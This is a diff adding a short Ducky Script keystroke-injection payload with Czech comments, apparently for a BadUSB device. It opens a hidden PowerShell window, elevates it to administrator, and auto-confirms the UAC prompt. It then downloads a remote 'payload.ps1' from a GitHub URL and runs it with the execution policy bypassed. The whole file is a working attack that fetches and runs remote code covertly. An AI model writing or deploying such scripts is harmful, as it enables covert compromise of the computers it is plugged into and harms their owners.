@@ -1,0 +1,20 @@
+REM Spustí PowerShell jako správce a stáhne soubor ze zadané URL
+
+GUI SPACE
+
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -Command "Start-Process powershell -Verb runAs"
+ENTER
+DELAY 2000
+LEFTARROW
+ENTER
+
+REM Stisknutí kláves pro potvrzení UAC (pokud je v angličtině – může být potřeba upravit)
+ALT y
+DELAY 1000
+
+REM Stáhne soubor a spustí ho s vypnutou execution policy
+STRING powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/JiriWeiss/Vecra/main/Vecra.ps1' -OutFile $env:TEMP\payload.ps1; Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File `\"$env:TEMP\payload.ps1`\"'"
+ENTER
